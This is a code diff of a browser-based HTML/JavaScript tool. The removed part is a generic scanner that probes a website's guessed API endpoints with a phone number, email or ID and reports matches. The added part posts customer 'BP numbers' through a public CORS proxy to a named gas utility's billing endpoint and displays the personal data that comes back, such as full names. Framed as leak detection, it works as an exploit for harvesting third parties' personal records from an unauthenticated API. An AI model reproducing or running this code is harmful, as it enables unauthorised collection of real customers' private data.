-        const commonEndpoints = ['/api', '/ajax', '/get', '/post', '/details', '/info', '/data', '/customer', '/user', '/order', '/bill', '/payment', '/mobile', '/email', '/profile', '/account'];
-        for (const endpoint of commonEndpoints) {
-            const fullUrl = baseUrl + endpoint;
-            if (text.includes(endpoint) && !apis.includes(fullUrl)) {
-                apis.push(fullUrl);
-            }
-        }
-
-        return apis;
-    }
-
-    // ─── SCAN API ───
-    async function scanApi(url, method, params, searchValue) {
-        const results = [];
-        try {
-            const proxy = 'https://corsproxy.io/?';
-            for (const param of params) {
-                try {
-                    let response;
-                    if (method === 'GET') {
-                        const sep = url.includes('?') ? '&' : '?';
-                        response = await fetch(proxy + encodeURIComponent(url + sep + param + '=' + searchValue), {
-                            signal: AbortSignal.timeout(5000)
-                        });
-                    } else {
-                        const fd = new URLSearchParams();
-                        fd.append(param, searchValue);
-                        response = await fetch(proxy + encodeURIComponent(url), {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                            body: fd.toString(),
-                            signal: AbortSignal.timeout(5000)
-                        });
-                    }
-                    const text = await response.text();
-                    if (text.includes(searchValue)) {
-                        results.push({ param, method, status: response.status, response: text });
-                    }
-                } catch (e) {
-                    // Skip
-                }
-            }
-        } catch (e) {
-            // Skip
-        }
-        return results;
-    }
-
-    // ─── MAIN SCAN ───
-    document.getElementById('scanBtn').addEventListener('click', async function() {
-        if (isRunning) return;
-
-        const url = targetUrl.value.trim();
-        const data = searchData.value.trim();
-        const custom = customParam.value.trim();
-
-        if (!url) {
-            setStatus('⚠️ Please enter a website URL', 'warning');
-            return;
-        }
-        if (!data) {
-            setStatus('⚠️ Please enter some data to search (mobile, email, ID, etc.)', 'warning');
-            return;
-        }
-
-        let cleanUrl = url;
-        if (!cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
-            cleanUrl = 'https://' + cleanUrl;
-        }
-        if (cleanUrl.endsWith('/')) cleanUrl = cleanUrl.slice(0, -1);
-
-        isRunning = true;
-        this.disabled = true;
-        this.innerHTML = `<span class="spinner"></span> AI Scanning...`;
-        clearAll();
-
-        // ─── AI DETECT DATA TYPE ───
-        const dataType = detectDataType(data);
-        log(`🤖 AI Detected: ${dataType.label}`, 'ai');
-
-        // ─── AI SUGGEST PARAMS ───
-        let params = [];
-        if (custom) {
-            params = [custom];
-        } else {
-            params = suggestParams(dataType.type, cleanUrl);
-        }
-        log(`🔍 AI Suggested ${params.length} parameters to try`, 'ai');
-
-        setStatus(`⏳ AI scanning ${cleanUrl} for "${data}" (${dataType.label})...`, 'info');
-        log(`🚀 Starting AI autonomous scan on: ${cleanUrl}`, 'info');
-        log(`📌 Search Data: ${data} (${dataType.label})`, 'info');
-        log(`📌 Parameters: ${params.join(', ')}`, 'info');
-
-        try {
-            // ─── FETCH MAIN PAGE ───
-            const result = await fetchPage(cleanUrl);
-            const source = result.text;
-            const status = result.status;
-
-            if (status === 0 || !source) {
-                setStatus('❌ Failed to fetch page. Check URL or network.', 'error');
-                log(`❌ Failed to fetch: ${cleanUrl}`, 'error');
-                this.disabled = false;
-                this.innerHTML = '<i class="fas fa-brain"></i> AI Auto Scan';
-                return;
-            }
-
-            log(`✅ Page fetched: ${source.length} characters`, 'success');
-
-            // ─── FIND APIS ───
-            const apis = findApis(source, cleanUrl);
-            log(`🔗 Found ${apis.length} potential API endpoints`, 'info');
-
-            // ─── SEARCH IN PAGE SOURCE ───
-            let pageMatches = [];
-            if (source.includes(data)) {
-                // Find context
-                const idx = source.indexOf(data);
-                const start = Math.max(0, idx - 100);
-                const end = Math.min(source.length, idx + data.length + 100);
-                const context = source.substring(start, end);
-                pageMatches.push({ location: 'Page Source', context, matched: data });
-            }
-
-            // ─── SCAN APIS ───
-            let apiResults = [];
-            const methods = ['GET', 'POST'];
-            let totalScanned = 0;
-            let totalParams = 0;
-
-            for (const api of apis) {
-                for (const method of methods) {
-                    const results = await scanApi(api, method, params, data);
-                    if (results.length > 0) {
-                        apiResults.push({ api, method, results });
-                    }
-                    totalScanned++;
-                    totalParams += results.length;
-
-                    // Update progress
-                    const pct = Math.min(100, Math.round((totalScanned / (apis.length * 2)) * 100));
-                    progressFill.style.width = pct + '%';
-                    progressLabel.textContent = `${totalScanned} / ${apis.length * 2}`;
-                    progressPercent.textContent = pct + '%';
-                }
-            }
-
-            progressWrap.style.display = 'block';
-
-            // ─── COMPILE ALL LEAKS ───
-            let allLeaks = [];
-
-            // Page source leaks
-            pageMatches.forEach(m => {
-                allLeaks.push({
-                    type: '📄 Page Source',
-                    value: data,
-                    location: cleanUrl,
-                    context: m.context,
-                    param: 'N/A',
-                    method: 'N/A'
-                });
-            });
-
-            // API leaks
-            apiResults.forEach(apiResult => {
-                apiResult.results.forEach(r => {
-                    allLeaks.push({
-                        type: '🔌 API Response',
-                        value: data,
-                        location: apiResult.api,
-                        context: r.response.substring(0, 500),
-                        param: r.param,
-                        method: r.method
-                    });
-                });
-            });
-
-            // ─── UPDATE STATS ───
-            const totalApis = apis.length;
-            statPages.textContent = totalApis + 1;
-            statParams.textContent = params.length;
-            statLeaks.textContent = allLeaks.length;
-            statMatches.textContent = allLeaks.length;
-            statBox.style.display = 'grid';
-
-            // ─── DISPLAY LEAKS ───
-            let leaksHTML = '';
-            if (allLeaks.length > 0) {
-                leaksHTML = allLeaks.map(l => `
-                    <div class="leak-item">
-                        <div class="header">
-                            <span class="type">${l.type}</span>
-                            <span class="location">${escapeHtml(l.location)}</span>
-                            <span class="badge-leak">🔴 LEAK</span>
-                        </div>
-                        <div class="value">${escapeHtml(l.value)}</div>
-                        <div class="param-used">${l.method} | Param: ${l.param}</div>
-                        <div class="context">${escapeHtml(l.context)}...</div>
-                    </div>
-                `).join('');
-            } else {
-                leaksHTML = `
-                    <div class="empty-state">
-                        <i class="fas fa-check-circle" style="color:#22c55e;"></i>
-                        <h3>✅ No data leaks found</h3>
-                        <p>AI scanned ${totalApis + 1} pages/APIs with ${params.length} parameters and found no matches for "${data}".</p>
-                    </div>
-                `;
-            }
-            document.getElementById('tab-leaks').innerHTML = leaksHTML;
-            leakCount.textContent = allLeaks.length;
-
-            // ─── AI ANALYSIS ───
-            const riskLevel = allLeaks.length > 0 ? '🔴 CRITICAL' : '🟢 SECURE';
-            const riskColor = allLeaks.length > 0 ? 'danger-ai' : 'safe-ai';
-            const aiHTML = `
-                <div class="ai-analysis">
-                    <div class="ai-header">
-                        <div class="ai-icon"><i class="fas fa-brain"></i></div>
-                        <div class="ai-title">DeepSeek AI Analysis</div>
-                    </div>
-                    <div class="ai-content">
-                        <p><strong>Data Type Detected:</strong> ${dataType.label}</p>
-                        <p><strong>Parameters Tested:</strong> ${params.length} (${params.join(', ')})</p>
-                        <p><strong>APIs Scanned:</strong> ${totalApis}</p>
-                        <p><strong>Risk Assessment:</strong> <span class="${riskColor}">${riskLevel}</span></p>
-                        <p><strong>Leaks Found:</strong> ${allLeaks.length}</p>
-                        <hr style="border-color:#1a2744;margin:10px 0;" />
-                        <p><strong>💡 AI Recommendations:</strong></p>
-                        <ul style="list-style:none;padding:0;margin-top:8px;">
-                            ${allLeaks.length > 0 ? `
-                                <li style="padding:4px 0;">🔒 <span class="highlight-ai">Immediate Action:</span> Remove "${data}" from API responses</li>
-                                <li style="padding:4px 0;">🛡️ <span class="highlight-ai">Authentication:</span> Add OTP/Login before returning data</li>
-                                <li style="padding:4px 0;">⏱️ <span class="highlight-ai">Rate Limiting:</span> Block multiple requests from same IP</li>
-                                <li style="padding:4px 0;">📋 <span class="highlight-ai">Audit Log:</span> Track all API access for security review</li>
-                            ` : `
-                                <li style="padding:4px 0;">✅ <span class="safe-ai">No data leaks detected. Website is secure for "${data}".</span></li>
-                                <li style="padding:4px 0;">🔄 <span class="safe-ai">Schedule regular security audits with DeepSeek AI.</span></li>
-                            `}
-                        </ul>
-                        <hr style="border-color:#1a2744;margin:10px 0;" />
-                        <p style="font-size:12px;color:#64748b;">
-                            <i class="fas fa-robot"></i> Analyzed by DeepSeek AI • ${new Date().toLocaleString()}
-                        </p>
+        let leakHTML = '';
+        if (hasLeak) {
+            leakHTML = `
+                <div style="background:#1c0d0d;border:1px solid #ef4444;border-radius:8px;padding:12px 16px;margin-bottom:16px;">
+                    <strong style="color:#ef4444;">🔴 ${leaks.length} Data Leak${leaks.length > 1 ? 's' : ''} Detected!</strong>
+                    <div style="color:#8b949e;font-size:13px;margin-top:4px;">
+                        Personal data exposed: ${leaks.map(l => `${l.type}: ${escapeHtml(l.value)}`).join(' | ')}
                     </div>
                 </div>
             `;
-            document.getElementById('tab-ai').innerHTML = aiHTML;
+        }
 
-            // ─── SOURCE TAB ───
-            let sourceHTML = `<div class="source-view">`;
-            let displaySource = source.substring(0, 5000);
-            let escapedSource = escapeHtml(displaySource);
-            // Highlight the searched data
-            const regex = new RegExp(data.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g');
-            escapedSource = escapedSource.replace(regex, match => `<span class="highlight">${match}</span>`);
-            sourceHTML += escapedSource;
-            if (source.length > 5000) {
-                sourceHTML += `\n\n... (${source.length - 5000} more characters)`;
-            }
-            sourceHTML += `</div>`;
-            document.getElementById('tab-source').innerHTML = sourceHTML;
-
-            // ─── APIS TAB ───
-            let apisHTML = '';
-            if (apis.length > 0) {
-                apisHTML = apis.map(api => `
-                    <div class="leak-item" style="border-left-color:#3b82f6;">
-                        <div class="header">
-                            <span class="type" style="color:#3b82f6;">🔗 API</span>
-                            <span class="location">${escapeHtml(api)}</span>
-                        </div>
+        return `
+            <div class="result-card">
+                <div class="result-header">
+                    <div class="title">
+                        <i class="fas fa-user-circle"></i>
+                        ${d.full_name || 'Customer Data'}
                     </div>
-                `).join('');
-            } else {
-                apisHTML = `
-                    <div class="empty-state">
-                        <i class="fas fa-plug" style="color:#64748b;"></i>
-                        <h3>No APIs found</h3>
-                        <p>No API endpoints detected in the page source.</p>
-                    </div>
-                `;
-            }
-            document.getElementById('tab-apis').innerHTML = apisHTML;
-            apiCount.textContent = apis.length;
+                    <span class="badge-risk">${hasLeak ? '⚠️ LEAK' : '🔒 SECURE'}</span>
+                </div>
+                <div class="result-body">
+                    ${leakHTML}
+                    <div class="result-grid">${itemsHTML}</div>
+                    <details style="margin-top:16px;">
+                        <summary style="cursor:pointer;color:#64748b;font-size:13px;">
+                            <i class="fas fa-code"></i> View Raw API Response
+                        </summary>
+                        <div class="response-box">${escapeHtml(responseText || 'No response')}</div>
+                    </details>
+                </div>
+            </div>
+        `;
+    }
 
-            // ─── SHOW RESULTS ───
-            resultsDiv.style.display = 'block';
-            progressFill.style.width = '100%';
-            progressLabel.textContent = `${totalApis + 1} / ${totalApis + 1}`;
-            progressPercent.textContent = '100%';
+    // ─── MAIN FETCH ───
+    document.getElementById('fetchBtn').addEventListener('click', async function() {
+        const bp = bpInput.value.trim();
 
-            // ─── STATUS ───
-            if (allLeaks.length > 0) {
-                setStatus(`🔴 ${allLeaks.length} data leaks found by AI!`, 'error');
-            } else {
-                setStatus(`✅ No leaks found for "${data}"`, 'success');
-            }
+        if (!bp) {
+            setStatus('⚠️ Please enter a BP Number', 'warning');
+            return;
+        }
 
-            log(`🏁 AI scan complete! ${allLeaks.length} leaks found.`, 'success');
+        this.disabled = true;
+        this.innerHTML = `<span class="spinner"></span> Fetching...`;
+        clearAll();
 
-            // ─── TAB SWITCHING ───
-            document.querySelectorAll('.result-tabs button').forEach(btn => {
-                btn.addEventListener('click', function() {
-                    document.querySelectorAll('.result-tabs button').forEach(b => b.classList.remove('active'));
-                    this.classList.add('active');
-                    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-                    document.getElementById('tab-' + this.dataset.tab).classList.add('active');
-                });
+        setStatus(`⏳ Fetching data for BP: ${bp}...`, 'info');
+        log(`🚀 Fetching data for BP: ${bp}`, 'info');
+
+        try {
+            // ─── MGL API ENDPOINT ───
+            const proxy = 'https://corsproxy.io/?';
+            const targetUrl = 'https://www.mahanagargas.com/ajax/get-billing-details';
+
+            const params = new URLSearchParams();
+            params.append('bpNumber', bp);
+            params.append('bp', bp);
+            params.append('bp_number', bp);
+
+            const response = await fetch(proxy + encodeURIComponent(targetUrl), {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: params.toString(),
+                signal: AbortSignal.timeout(10000)
             });
+
+            let responseText = await response.text();
+            let json = null;
+
+            try {
+                json = JSON.parse(responseText);
+            } catch (e) {
+                // Try to extract JSON from response
+                const match = responseText.match(/\{.*\}/s);
+                if (match) {
+                    try {
+                        json = JSON.parse(match[0]);
+                    } catch (e2) {}
+                }
+            }
+
+            if (!json || !json.response) {
+                setStatus(`❌ No data found for BP: ${bp}`, 'error');
+                log(`❌ No data found for BP: ${bp}`, 'error');
+                this.disabled = false;
+                this.innerHTML = '<i class="fas fa-download"></i> Fetch Data';
+                return;
+            }
+
+            // ─── DETECT LEAKS ───
+            const leaks = detectLeak(responseText);
+            const hasLeak = leaks.length > 0;
+
+            // ─── BUILD RESULT ───
+            resultDiv.innerHTML = buildResult(json, responseText, leaks, bp);
+            resultDiv.style.display = 'block';
+
+            setStatus(
+                hasLeak ?
+                `🔴 ${leaks.length} Data Leak${leaks.length > 1 ? 's' : ''} Found!` :
+                '✅ No data leaks detected',
+                hasLeak ? 'error' : 'success'
+            );
+
+            log(`✅ Data fetched successfully for BP: ${bp}`, 'success');
+            if (hasLeak) {
+                log(`🔴 ${leaks.length} leaks detected`, 'error');
+            }
 
         } catch (error) {
             setStatus(`❌ Error: ${error.message}`, 'error');
             log(`❌ ${error.message}`, 'error');
         } finally {
-            isRunning = false;
             this.disabled = false;
-            this.innerHTML = '<i class="fas fa-brain"></i> AI Auto Scan';
+            this.innerHTML = '<i class="fas fa-download"></i> Fetch Data';
         }
     });
 </script>
